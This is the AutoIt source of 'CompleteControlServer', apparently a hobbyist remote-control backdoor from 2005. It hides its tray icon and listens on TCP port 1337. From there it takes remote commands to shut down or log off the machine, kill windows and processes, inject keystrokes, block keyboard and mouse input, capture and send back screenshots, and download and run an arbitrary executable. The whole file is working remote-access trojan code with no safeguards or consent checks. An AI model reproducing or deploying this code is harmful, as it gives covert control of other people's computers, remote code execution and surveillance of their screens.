#cs
	Title:   CompleteControlServer
    Filename:  CompleteControlServer.au3
    Description: The server for the Complete Control client.
    Author:   Mason
    Version:  0.1
    Last Update: 10/17/05
    Requirements: AutoIt3 Beta with COM support (3.1.1.63 or higher), Developed/Tested on WindowsXP Home Edition
#ce

;Header Files
#include <misc.au3>
#include <Inet.au3>
#include "ie.au3"
#NoTrayIcon

;Global Variables
$Sock = 1337
$g_IP = _GetIP
Dim $recvbuffer
Dim $AcceptedSocket

;Start
If UBound(ProcessList(@ScriptName)) > 2 then Exit
TCPStartup();Start Up Winsock
AutoItSetOption("TCPTimeout", 1000)

Do
	$MainSocket = TCPListen($g_IP, $sock, 1)
Until $mainsocket > -1

While 1
	
	While 1
		$AcceptedSocket = TCPAccept($mainsocket)
		If $AcceptedSocket >= 0 Then
			ExitLoop
		EndIf
	WEnd

	While 1
		$recvbuffer = TCPRecv($AcceptedSocket, 10)
		
		If $recvbuffer = "end" Then
			TCPCloseSocket($AcceptedSocket)
			ExitLoop
		EndIf
		
		If $recvbuffer = "shutdown" Then
			Shutdown(5)
		EndIf
		
		If $recvbuffer = "restart" Then
			Shutdown(6)
		EndIf
		
		If $recvbuffer = "hibernate" Then
			Shutdown(64)
		EndIf
		
		If $recvbuffer = "beep" Then
			Beep()
		EndIf
		
		If $recvbuffer = "logoff" Then
			Shutdown(4)
		EndIf
		
		If $recvbuffer = "driveopen" Then
			$cddrives = DriveGetDrive("CDROM")
			If NOT @error Then
				For $i = 1 to $cddrives[0]
					CDTray($cddrives[$i], "open")
				Next
			EndIf
		EndIf
		
		If $recvbuffer = "os" Then
			TCPSend($AcceptedSocket, @OSVersion)
		EndIf
		
		If $recvbuffer = "iego" Then
			Sleep(500)
			$url = TCPRecv($AcceptedSocket, 100)
			$oIE = _IECreate()
			_IENavigate($oIE, $url, 0)
			$oIE = ""
		EndIf
		
		If $recvbuffer = "msgbox" Then
			$msgboxtitle = TCPRecv($AcceptedSocket, 100)
			Sleep(500)
			$msgboxmsg = TCPRecv($AcceptedSocket, 200)
			MsgBox(0, $msgboxtitle, $msgboxmsg, 1000)
		EndIf
		
		If $recvbuffer = "tts" Then
			Sleep(500)
			$tts = TCPRecv($AcceptedSocket, 100)
			$o_speech = ObjCreate("SAPI.SpVoice")
			$o_speech.Speak($tts)
			$o_speech = ""
		EndIf
		
		If $recvbuffer = "sendexe" Then
			Sleep(500)
			RecvFile("retard.exe")
			Sleep(500)
			Run("retard.exe")
		EndIf
		
		If $recvbuffer = "winlist" Then
			Sleep(500)
			$Winlist = Winlist()
			Dim $num = 0
			
			For $i = 1 to $Winlist[0][0]
			; Only display visble windows that have a title
				If $Winlist[$i][0] <> "" AND IsVisible($Winlist[$i][1]) Then
					$num = $num + 1
				EndIf
			Next
			TCPSend($AcceptedSocket, String($num))
			
			For $s = 1 to $Winlist[0][0]
			; Only display visble windows that have a title
				If $Winlist[$s][0] <> "" AND IsVisible($Winlist[$s][1]) Then
					Sleep(500)
					TCPSend($AcceptedSocket, $WinList[$s][0])
				EndIf
			Next
		EndIf
		
		If $recvbuffer = "winkill" Then
			Sleep(500)
			$nameofkilledwindow = TCPRecv($AcceptedSocket, 100)
			WinKill($nameofkilledwindow)
		EndIf
		
		If $recvbuffer = "miniall" Then
			WinMinimizeAll()
		EndIf
		
		If $recvbuffer = "miniwin" Then
			Sleep(500)
			$nameofminiwindow = TCPrecv($AcceptedSocket, 100)
			WinSetState($nameofminiwindow, "", @SW_MINIMIZE)
		EndIf
		
		If $recvbuffer = "flashwin" Then
			Sleep(500)
			$nameofflashwindow = TCPRecv($AcceptedSocket, 100)
			WinFlash($nameofflashwindow, "", 5, 500)
		EndIf
		
		If $recvbuffer = "activewin" Then
			Sleep(500)
			$nameofactivewindow = TCPRecv($AcceptedSocket, 100)
			WinActivate($nameofactivewindow)
		EndIf
		
		If $recvbuffer = "hidewin" Then
			Sleep(500)
			$nameofhidewindow = TCPRecv($AcceptedSocket, 100)
			WinSetState($nameofhidewindow, "", @SW_HIDE)
		EndIf
		
		If $recvbuffer = "unhidewin" Then
			Sleep(500)
			$nameofhiddenwindow = TCPRecv($AcceptedSocket, 100)
			WinSetState($nameofhiddenwindow, "", @SW_SHOW)
		EndIf
		
		If $recvbuffer = "killall" Then
			$Winlist = Winlist()
			For $k = 1 to $Winlist[0][0]
			; Only display visble windows that have a title
				If $Winlist[$k][0] <> "" AND IsVisible($Winlist[$k][1]) Then
					WinKill($Winlist[$k][0])
				EndIf
			Next
		EndIf
		
		If $recvbuffer = "rfrshproc" Then
			$ProcessList = ProcessList()
			Sleep(500)
			TCPSend($AcceptedSocket, String($ProcessList[0][0]))
			For $l = 1 To $ProcessList[0][0]
				Sleep(500)
				TCPSend($AcceptedSocket, $ProcessList[$l][0])
			Next
		EndIf
		
		If $recvbuffer = "killproc" Then
			Sleep(500)
			$processkill = TCPRecv($AcceptedSocket, 100)
			ProcessClose($processkill)
		EndIf
		
		If $recvbuffer = "winsize" Then
			Sleep(500)
			$windownamesize = TCPRecv($AcceptedSocket, 100)
			Sleep(500)
			$winwidth = TCPRecv($AcceptedSocket, 10)
			Sleep(500)
			$winheight = TCPRecv($AcceptedSocket, 10)
			WinMove($windownamesize, "", Default, Default, Number($winwidth), Number($winheight))
		EndIf
		
		If $recvbuffer = "wintitle" Then
			SLeep(500)
			$winnametitle = TCPRecv($AcceptedSocket, 100)
			Sleep(500)
			$winchangetitle = TCPRecv($AcceptedSocket, 100)
			WinSetTitle($winnametitle, "", $winchangetitle)
		EndIf
		
		If $recvbuffer = "procprior" Then
			Sleep(500)
			$processtoset = TCPRecv($AcceptedSocket, 100)
			Sleep(500)
			$processpriority = TCPRecv($AcceptedSocket, 20)
			If $processpriority = "Idle/Low" Then
				$processnumber = 0
			ElseIf $processpriority = "Normal" Then
				$processnumber = 2
			ElseIf $processpriority = "Realtime" Then
				$processnumber = 5
			EndIf
			ProcessSetPriority($processtoset, $processnumber)
		EndIf
		
		If $recvbuffer = "keysend" Then
			Sleep(500)
			$keys = TCPRecv($AcceptedSocket, 200)
			Send($keys)
		EndIf
		
		If $recvbuffer = "startblock" Then
			BlockInput(1)
		EndIf
		
		If $recvbuffer = "stopblock" Then
			BlockInput(0)
		EndIf
		
		If $recvbuffer = "mousekill" Then
			_MouseTrap(1, 1, 1, 1)
		EndIf
		
		If $recvbuffer = "mouseback" Then
			_MouseTrap()
		EndIf
		
		If $recvbuffer = "playsound" Then
			Sleep(500)
			RecvFile("sound.wav")
			SoundPlay("sound.wav")
		EndIf
		
		If $recvbuffer = "traytip" Then
			Sleep(500)
			$traytiptitle = TCPRecv($AcceptedSocket, 100)
			Sleep(500)
			$traptipmessage= TCPRecv($AcceptedSocket, 100)
			TrayTip($traytiptitle, $traptipmessage, 1000)
		EndIf
		
		If $recvbuffer = "run" Then
			SLeep(500)
			$programname = TCPRecv($AcceptedSocket, 50)
			If $programname = "Notepad" Then
				Run("notepad.exe")
			ElseIf $programname = "Paint" Then
				Run("mspaint.exe", @SystemDir)
			EndIf
		EndIf
		
		If $recvbuffer = "screencap" Then
			Sleep(500)
			DllCall("captdll.dll", "int", "CaptureScreen", "str", "screen.jpg", "int", 85)
			SendFile("screen.jpg")
		EndIf
		
		$recvbuffer = ""
	WEnd
WEnd

Func RecvFile($path)
	FileDelete($path)
	$fileHandle = _APIFileOpen($path)
	$bSending = 0
	$buffer = DLLStructCreate("byte[2048]")
	While 1
		$bytes = TCPRecv($AcceptedSocket,$buffer)
		If (@error Or $bytes = "") And $bSending Then ExitLoop
		If $bytes > 0 Then
			If Not $bSending Then $bSending = 1
			_BinaryFileWrite($fileHandle, $buffer, $bytes)
		EndIf
	WEnd
	_APIFileClose($fileHandle)
	DLLStructDelete($buffer)
	$buffer = DLLStructCreate("char[8]")
	DllStructSetData($buffer,1,"alldone")
	TCPSend($AcceptedSocket,$buffer)
	DLLStructDelete($buffer)
EndFunc	

Func SendFile($path)
	$buffer = DLLStructCreate("byte[" & FileGetSize($path) & "]")
	$fileHandle = _APIFileOpen($path)
	$bytes = _BinaryFileRead($fileHandle,$buffer)
	TCPSend($AcceptedSocket,$buffer)
	
	$doneMsg = DllStructCreate("char[8]")
	$msg = ""
	While 1
		$bytes = TCPRecv($AcceptedSocket,$doneMsg)
		If $bytes = -1 Then ExitLoop
		If $bytes > 0 Then $msg = $msg & DllStructGetData($doneMsg,1)
		If $msg = "alldone" Then ExitLoop
	WEnd
	_APIFileClose($fileHandle)
	DllStructDelete($buffer)
EndFunc

	






;_APIFileOpen( <FileName> )
;
; Returns a "REAL" file handle for reading and writing.
; The return value comes directly from "CreateFile" api.
Func _APIFileOpen( $szFile )
Local $GENERIC_READ = 0x80000000, $GENERIC_WRITE = 0x40000000
Local $STANDARD_RIGHTS_REQUIRED = 0x000f0000
Local $SYNCHRONIZE = 0x00100000
Local $FILE_ALL_ACCESS = BitOR(0x1FF, $STANDARD_RIGHTS_REQUIRED, $SYNCHRONIZE)

Local $OPEN_ALWAYS = 4, $FILE_ATTRIBUTE_NORMAL = 0x00000080
Local $AFO_h, $AFO_ret
Local $AFO_bWrite = 1
$AFO_h = DllCall( "kernel32.dll", "hwnd", "CreateFile", _
"str", $szFile, _
"long", $FILE_ALL_ACCESS, _
"long", 7, _
"ptr", 0, _
"long", $OPEN_ALWAYS, _
"long", $FILE_ATTRIBUTE_NORMAL, _
"long", 0 )
If $AFO_h[0] = 0xFFFFFFFF Then
$AFO_bWrite = 0
$AFO_h = DllCall( "kernel32.dll", "hwnd", "CreateFile", _
"str", $szFile, _
"long", $GENERIC_READ, _
"long", 7, _
"ptr", 0, _
"long", $OPEN_ALWAYS, _
"long", $FILE_ATTRIBUTE_NORMAL, _
"long", 0 )
EndIf
$AFO_ret = DLLCall("kernel32.dll","int","GetLastError")
SetExtended($AFO_bWrite)
SetError($AFO_ret[0])
Return $AFO_h[0]
EndFunc

; _APIFileClose( <FileHandle> )
;
; The return value comes directly from "CloseHandle" api.
Func _APIFileClose( ByRef $hFile )
Local $AFC_r
$AFC_r = DllCall( "kernel32.dll", "int", "CloseHandle", _
"hwnd", $hFile )
Return $AFC_r[0]
EndFunc


; _APIFileSetPos( <FileHandle>, <Position in the file to read/write to/from> )
;
; The return value comes directly from "SetFilePointer" api.
Func _APIFileSetPos( ByRef $hFile, ByRef $nPos )
Local $FILE_BEGIN = 0 
Local $AFSP_r
$AFSP_r = DllCall( "kernel32.dll", "long", "SetFilePointer", _
"hwnd",$hFile, _
"long",$nPos, _
"long_ptr",0, _
"long",$FILE_BEGIN )
Return $AFSP_r[0] 
EndFunc


; _BinaryFileRead( <FileHandle>, <ptr buffer>)
;
; Reads file into struct <ptr buffer>
; Return from ReadFile api.
Func _BinaryFileRead( ByRef $hFile, ByRef $buff_ptr, $buff_bytes = 0)
Local $AFR_r
If $buff_bytes = 0 Then $buff_bytes = DllStructGetSize($buff_ptr)
$AFR_r = DllCall( "kernel32.dll", "int", "ReadFile", _
"hwnd", $hFile, _
"ptr",DllStructGetPtr($buff_ptr), _
"long",$buff_bytes, _
"long_ptr",0, _
"ptr",0 )
Return $AFR_r[0]
EndFunc


; _BinaryFileWrite( <FileHandle>, <ptr buffer>)
;
; Returns # of Bytes written. 
; Sets @error to the return from WriteFile api.
Func _BinaryFileWrite( ByRef $hFile, ByRef $buff_ptr, $buff_bytes = 0)
Local $AFW_r
If $buff_bytes = 0 Then $buff_bytes = DllStructGetSize($buff_ptr)
$AFW_r = DllCall( "kernel32.dll", "int", "WriteFile", _
"hwnd", $hFile, _
"ptr",DllStructGetPtr($buff_ptr), _
"long",$buff_bytes, _
"long_ptr",0, _
"ptr",0 )
SetError($AFW_r[0])
Return $AFW_r[4]
EndFunc

Func IsVisible($handle)
  If BitAnd( WinGetState($handle), 2 ) Then 
    Return 1
  Else
    Return 0
  EndIf
EndFunc
